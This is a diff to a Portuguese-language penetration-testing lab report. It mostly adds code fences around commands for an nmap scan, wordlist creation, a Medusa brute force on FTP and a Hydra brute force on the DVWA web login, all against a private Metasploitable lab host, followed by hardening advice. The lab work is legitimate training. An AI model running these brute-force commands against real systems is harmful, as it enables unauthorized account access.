@@ -49,6 +49,8 @@ Antes de começar os ataques, precisei garantir que o ambiente estava funcionand
 ![Teste de Conectividade](images/teste-conectividade-1.png)
 
 **O que eu fiz:**
+
+```bash
 # Tentei pingar o Google (para confirmar que NÃO tenho acesso à internet)
 ping google.com.br
 
@@ -67,6 +69,8 @@ Essa é uma das etapas mais importantes de qualquer teste de penetração. Usei 
 ![Scan Nmap](images/nmap-scan.png)
 
 **Comando que executei:**
+
+```bash
 nmap -sV -p 21,22,80,445,139 192.168.56.101
 ```
 
@@ -95,15 +99,20 @@ Para fazer os ataques de força bruta, precisei criar wordlists (listas de poss�
 ![Criação de Wordlists](images/criacao-wordlists.png)
 
 **Comandos que usei:**
+
+```bash
 # Lista de usuários comuns
 echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
 
 # Lista de senhas comuns
 echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
+```
 
 ![Validação das Wordlists](images/validacao-wordlists.png)
 
 **Conferindo se ficou certo:**
+
+```bash
 # Visualizando o conteúdo dos arquivos
 cat users.txt
 cat pass.txt
@@ -133,6 +142,8 @@ Comecei testando o serviço **FTP** que estava rodando na porta 21 do Metasploit
 **Ferramenta escolhida:** Medusa
 
 **Comando executado:**
+
+```bash
 medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 ```
 
@@ -156,6 +167,8 @@ Consegui! Encontrei as credenciais:
 ![Validação do Acesso FTP](images/validacao-ftp.png)
 
 **Validando o acesso manualmente:**
+
+```bash
 ftp 192.168.56.101
 # Login: msfadmin
 # Senha: msfadmin
@@ -175,6 +188,8 @@ Agora foi a vez de testar o formulário de login web do **DVWA**, uma aplicaçã
 **Ferramenta escolhida:** Hydra (melhor para ataques web)
 
 **Comando executado:**
+
+```bash
 hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form \
   "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
 ```
@@ -245,6 +260,8 @@ Essa é uma das melhores defesas! Mesmo que alguém descubra sua senha, ainda va
 | Monitorar tentativas de login | Detectar ataques em andamento | 🟡 Média |
 
 **Exemplo de configuração mais segura:**
+
+```bash
 # /etc/vsftpd.conf
 anonymous_enable=NO          # Sem acesso anônimo
 max_login_fails=3            # Bloquear após 3 tentativas
@@ -378,6 +395,8 @@ Com base nas vulnerabilidades identificadas e exploradas, recomendamos as seguin
 | ⏱️ **Rate Limiting** | Limitar tentativas por IP/tempo | 🟢 Baixa |
 
 **Exemplo de configuração vsftpd segura:**
+
+```bash
 # /etc/vsftpd.conf
 anonymous_enable=NO
 local_enable=YES
